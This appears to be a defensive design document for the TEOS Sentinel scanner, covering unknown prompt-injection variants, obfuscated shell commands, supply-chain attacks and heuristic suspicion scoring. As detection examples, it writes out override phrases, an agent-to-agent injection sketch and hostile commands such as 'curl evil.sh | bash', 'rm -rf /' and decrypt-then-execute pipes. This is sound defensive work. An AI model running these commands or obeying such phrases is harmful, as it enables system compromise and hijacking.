# TEOS Sentinel — Unknown Threat Modeling & Heuristic Layer

**Date:** 2026-06-12
**Classification:** Strategic Architecture Design

---

## Part 1: Unknown Threat Modeling

### 1.1 Novel Prompt Injection

Current `INJECTION.PROMPT` rules match known phrases ("ignore previous instructions", "you are now in debug mode"). Unknown variants include:

| Variant | Description | Why Current Rules Miss It |
|---------|-------------|--------------------------|
| **Chained injection** | 3+ messages that individually look benign but form an injection when concatenated | Each message independently scores ALLOW |
| **Meta-instruction** | "Set system prompt to: [payload]" — not an injection, but a meta-command | No meta-instruction category |
| **Indirect injection** | Injected via retrieved data from a vector database or external source | Not present in the message text |
| **Multi-modal** | Payload split across text + image alt text + filename | Only text channel is analyzed |
| **Encoding-shifted** | "Ov3rrid3 pr3v10us instruct10ns" — leetspeak | All patterns are literal |

**Countermeasure:** A **heuristic suspicion score** that detects injection-adjacent signals without matching known patterns. Signals would include:
- Message contains meta-references ("system", "prompt", "instruction", "override")
- Message contains both a command and a meta-reference
- Message length anomaly (significantly longer than expected)

### 1.2 Obfuscated Shell Commands

Current `OBFUSCATION.BASE64_PIPE` detects base64 pipe chains. Unknown variants:

| Variant | Example | Current Detection |
|---------|---------|------------------|
| **Base85** | `echo $payload | base85 -d | bash` | Not detected |
| **Hex pipe** | `echo 726d... | xxd -r -p | bash` | Not detected |
| **Decoy + real** | `curl legit.com; curl evil.sh | bash` | Only first command matched |
| **Two-message split** | Msg 1: `curl evil.sh`, Msg 2: `| bash` | Each independently ALLOW |
| **Unicode confusable** | `rm -rf /` with Cyrillic `r` and `m` | Not detected |
| **Variable construction** | `a=rm;b=-rf;eval $a $b /` | Variable-level patterns not covered |
| **String interpolation** | `/bin/bas$(echo h)` | Shell-in-shell not detected |

**Countermeasure:** Normalization layer before rule matching:
1. Unicode normalization (NFKC)
2. Consider replacing encoded forms to text
3. String interpolation expansion
4. Consider variable resolution candidate detection

### 1.3 Multi-Stage Execution Chains

Attacks spanning multiple messages or multiple commands where no single command is dangerous:

```
Stage 1: git clone https://github.com/evil/payload
Stage 2: cd payload && make
Stage 3: sudo ./install.sh
```

Each stage individually is ALLOW. The chain is BLOCK.

**Countermeasure:** Session-level aggregation — track recent commands per user and evaluate chains.

### 1.4 Encoded Payloads (Beyond Base64)

| Encoding | Example | Current Detection |
|----------|---------|------------------|
| **AES-256-CBC** | `openssl enc -aes-256-cbc -d -in payload.enc -k key \| bash` | Not detected |
| **XOR cipher** | `python3 -c "print(''.join(chr(ord(c)^0x42)for c in s))" \| python3` | Not detected |
| **Gzip + Base64** | `echo "H4sI..." | base64 -d | zcat | bash` | Not detected |
| **Custom encoding** | Any custom encoding in Python/Perl/Ruby | Not detected |

**Countermeasure:** Detect **decryption + execution** as a signal pair — any command that both transforms data and pipes to a shell.

### 1.5 Agent-to-Agent Attacks (MCP Abuse)

An AI agent sends malicious messages to another agent via MCP protocol:

```
Agent A: "Scan this: [payload designed to exploit agent B's prompt injection]"
Agent B: "Verdict: BLOCK - wait no, I mean ALLOW" (injected)
```

**Countermeasure:** Cross-request consistency check. Same input to different agents should produce same verdict. If `scan("rm -rf /")` returns `ALLOW` for one agent and `BLOCK` for another, flag as compromise.

### 1.6 Tool Poisoning

An attacker modifies the output of a security tool to return ALLOW for malicious content:

```
Tool output before: "Verdict: BLOCK, Score: 85"
Tool output after poisoning: "Verdict: ALLOW, Score: 12"
```

**Countermeasure:** Cryptographic audit chain — each scan result is hashed and stored off-system. Verification: re-compute hash of scan input → expected output matches stored hash.

### 1.7 Supply-Chain Manipulation

| Attack | Description | Current Detection |
|--------|-------------|------------------|
| **Typosquatting** | `requets` instead of `requests` | Not detected |
| **Dependency confusion** | `internal-lib` published to public npm with higher version | Not detected |
| **Malicious dev dependency** | `eslint-config-evil` with postinstall script | `postinstall` scripts not analyzed |
| **Lockfile poisoning** | Modified integrity hash in package-lock.json | Not detected |
| **Binary dep backdoor** | Prebuilt .node binary with hidden payload | Not detected |

### 1.8 Social Engineering Attacks

Content designed to trick human reviewers:

```
"chmod 777 /tmp/test — this is safe, just fixing permissions for our test environment"
```

The explanation is designed to make a human override the BLOCK verdict.

**Countermeasure:** If a command is BLOCK-level and the user provides an explanation, include the reasoning in the audit log with high prominence. Do NOT provide an "override" button in audit review UIs without multi-party approval.

### 1.9 AI-Generated Exploit Variants

LLMs generate endless variations of known exploit patterns. The deterministic rule set has a fixed number of patterns — an adversary with an LLM can generate millions of variants.

**Countermeasure:** Regular expression entropy checking. If user input has sign of an LLM-generated payload (unusual repetition, systematic variation around known patterns), flag for REVIEW.

---

## Part 2: Heuristic Suspicion Scoring Layer (Design)

### 2.1 Architecture

```
User Input
    │
    ▼
┌──────────────────────┐
│  Normalization Layer │ → Unicode NFKC, trim, decode URL
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐     ┌──────────────────────┐
│  Deterministic Rules  │ ──▶ │ Heuristic Suspicion   │
│  (258 rules,          │     │ Scoring (0-100)       │
│   authoritative)      │     │                       │
│  BLOCK/WARN/ALLOW     │     │ Signals:              │
└──────────────────────┘     │ • Obfuscation signals  │
           │                  │ • Encoding signals     │
           ▼                  │ • Indirection signals  │
           │                  │ • Execution signals    │
           │                  │ • Stealth signals      │
           │                  │ • Anomaly signals      │
           │                  │ • Chain signals        │
           │                  └──────────┬──────────────┘
           │                             │
           ▼                             ▼
    ┌─────────────────────────────────────────┐
    │  Adjudication Layer                      │
    │  ┌────────────────────────────────────┐  │
    │  │  IF deterministic verdict ≠ ALLOW  │  │
    │  │    → Use deterministic verdict     │  │
    │  │  IF deterministic = ALLOW          │  │
    │  │    AND suspicion > 60             │  │
    │  │    → Upgrade to WARN              │  │
    │  │  IF deterministic = ALLOW          │  │
    │  │    AND suspicion > 80             │  │
    │  │    → Upgrade to BLOCK             │  │
    │  └────────────────────────────────────┘  │
    └─────────────────────────────────────────┘
```

**Key principle:** Deterministic rules remain authoritative. Heuristic suspicion can only **upgrade** (ALLOW → WARN → BLOCK), never downgrade.

### 2.2 Suspicion Signals

Each signal contributes 0 to a weighted score (max 100):

#### Obfuscation Signals (Max 35)
| Signal | Weight | Description |
|--------|--------|-------------|
| `obfuscation.encoding` | 20 | Base64, Base85, hex, gzip, base32 present |
| `obfuscation.unicode_confusable` | 15 | Unicode homoglyphs, bidi characters |
| `obfuscation.multi_encoding` | 25 | Nested encoding (base64 inside gzip inside hex) |
| `obfuscation.null_bytes` | 15 | Presence of null bytes |
| `obfuscation.reverse_string` | 10 | Reversed strings (`echo '...' \| rev \| bash`) |

#### Execution Signals (Max 30)
| Signal | Weight | Description |
|--------|--------|-------------|
| `exec.pipe_to_shell` | 20 | Any pipe (`\|`) to bash/sh/zsh/python/perl |
| `exec.decrypt_then_run` | 25 | Decryption/decoding followed by execution |
| `exec.download_then_run` | 20 | Download (curl/wget) followed by execution |
| `exec.background` | 10 | Background execution (`&`, `nohup`, `disown`) |
| `exec.scheduled` | 15 | cron, at, systemd timer creation |

#### Stealth Signals (Max 20)
| Signal | Weight | Description |
|--------|--------|-------------|
| `stealth.hidden_file` | 10 | Writing to `.file` or `..file` |
| `stealth.stdout_redirect` | 10 | Redirect to `/dev/null`, `2>&1` |
| `stealth.unset_history` | 15 | `unset HISTFILE`, `export HISTSIZE=0` |
| `stealth.cleanup` | 10 | `rm -rf` temp files after execution |

#### Indirection Signals (Max 25)
| Signal | Weight | Description |
|--------|--------|-------------|
| `indirection.variable_construction` | 15 | Building commands via variables |
| `indirection.curl_bash` | 25 | Standard `curl URL | bash` (even without known evil URL) |
| `indirection.dynamic_import` | 20 | `import()`, `require()` with variable path |
| `indirection.proxy_through_dns` | 15 | DNS-based data exfiltration patterns |

#### Anomaly Signals (Max 15)
| Signal | Weight | Description |
|--------|--------|-------------|
| `anomaly.high_entropy` | 10 | Entropy > 4.5 bits/byte |
| `anomaly.long_single_line` | 5 | Single line > 500 chars |
| `anomaly.repeated_patterns` | 8 | Systematic variation suggesting LLM-generated variants |

#### Chain Signals (Max 25)
| Signal | Weight | Description |
|--------|--------|-------------|
| `chain.multi_stage` | 25 | Sequence of commands across messages that form attack chain |
| `chain.repeated_similar` | 15 | Same command pattern repeated with different args |

### 2.3 Scoring Logic

```python
raw_score = min(100, sum(all_signal_weights))
suspicion_level = (
    "LOW" if raw_score < 30 else
    "MEDIUM" if raw_score < 55 else
    "HIGH" if raw_score < 80 else
    "CRITICAL"
)
```

### 2.4 Result Combination

| Deterministic | Suspicion | Final |
|---------------|-----------|-------|
| ALLOW | < 60 | ALLOW |
| ALLOW | 60-79 | WARN |
| ALLOW | >= 80 | BLOCK |
| WARN | < 30 | WARN |
| WARN | 30-79 | WARN |
| WARN | >= 80 | BLOCK |
| BLOCK | any | BLOCK |

---

## Part 3: Context Engine Design

### 3.1 Purpose

Adjust risk scoring based on the context in which a command/code is used. Same command, different contexts → different risk.

### 3.2 Context Dimensions

| Dimension | Values | Effect on Suspicion |
|-----------|--------|-------------------|
| **Source** | user_input, repo_scan, ci_trigger, webhook, mcp_request | CI triggers get +15 suspicion |
| **Location** | production, staging, development, test, documentation, ci_cd | Test/doc get -20, prod gets +10 |
| **Repository type** | infrastructure, application, config, documentation, blockchain | Blockchain repos get Solana/EVM context |
| **User role** | admin, developer, ci_bot, automated_agent, guest | Guest +20, admin -10 |
| **Message history** | first_interaction, repeated, known_developer, suspected_attacker | Suspected attacker +30 |
| **File path** | src/, test/, docs/, scripts/, .github/workflows/, config/ | Config +10, scripts +15, test -15 |
| **Project maturity** | new_project, active_development, stable, archived | Archive -20, new +10 |

### 3.3 Context-Aware Threshold Adjustments

```python
context_modifier = sum(context_signals)
effective_threshold = BASE_THRESHOLD + context_modifier

# Example: `rm -rf /` in a test file
context_modifier = -20 (test location)
effective_suspicion = 75 - 20 = 55
# If combined with deterministic ALLOW, suspicion 55 < 60 → still ALLOW
```

### 3.4 Implementation as Middleware

The context engine sits **before** the heuristic layer and enriches the analysis context:

```
Input + Metadata → Context Engine → Enriched Input → Deterministic Rules
                                                        ↓
                                              Heuristic Suspicion Layer
                                                        ↓
                                              Context-Aware Adjudication
                                                        ↓
                                                    Result
```

### 3.5 False Positive Guard

To prevent context from being used as a permanent bypass:

- Context modifiers have a **maximum absolute value** of 30
- No single context dimension can change the verdict by more than one step
- Context is logged alongside every verdict for auditability
- Contextual overrides require administrator consent

---

## Part 4: Black-Box Unknown Input Handling

### 4.1 The Fundamental Question

**If a threat does not match any existing rule, what mechanism prevents TEOS Sentinel from incorrectly returning ALLOW?**

### 4.2 Answer: Three-Layer Defense

```
Layer 1: Deterministic Rules (258 rules)
    ↓ Match? → Yes → Return BLOCK/WARN/ALLOW
    ↓ No match
Layer 2: Heuristic Suspicion Scoring (0-100)
    ↓ Score > 80? → Yes → Upgrade to BLOCK
    ↓ Score > 60? → Yes → Upgrade to WARN
    ↓ Score < 60
Layer 3: REVIEW Verdict
    ↓
    Return "REVIEW — no matching rule, elevated suspicion signals detected"
    + Store in audit trail for manual review
    + Alert security team
```

The **REVIEW verdict** is the answer. Neither ALLOW nor BLOCK is returned for unknown threats with elevated suspicion. Instead, the system explicitly signals that it cannot classify the input and requires human review.

### 4.3 REVIEW Verdict Behavior

- **In Telegram bot**: "⚠️ REVIEW — This content triggered heuristic alerts but doesn't match known threat patterns. Flagged for security team review."
- **In MCP engine**: `{ verdict: "REVIEW", score: suspicion_score, epistemic: "UNCERTAIN", action_required: "human_review" }`
- **In CI/CD pipeline**: Pipeline paused, requires manual approval to proceed.
- **In audit trail**: Logged with full context, user ID, suspicion breakdown.

### 4.4 Epistemic States (Expanded)

| State | Meaning | When |
|-------|---------|------|
| `CONFIDENT` | High rule match, high consensus | Deterministic match + high suspicion agreement |
| `PROVISIONAL` | Partial match, pending info | Single rule match, low severity |
| `CONFLICTED` | Contradictory signals | Different rules produce opposite recommendations |
| `LOW_CONFIDENCE` | Weak match, high uncertainty | Low severity rule match, high suspicion |
| `UNCERTAIN` | No match, signals present | No rules matched, suspicion > 60 → REVIEW |
| `UNKNOWN` | No match, no signals | No rules, suspicion < 30 → ALLOW (logged) |
| `INSUFFICIENT_CONTEXT` | Input too short | < 3 characters |

---

*Audit timestamp: 2026-06-12T04:00:00Z*
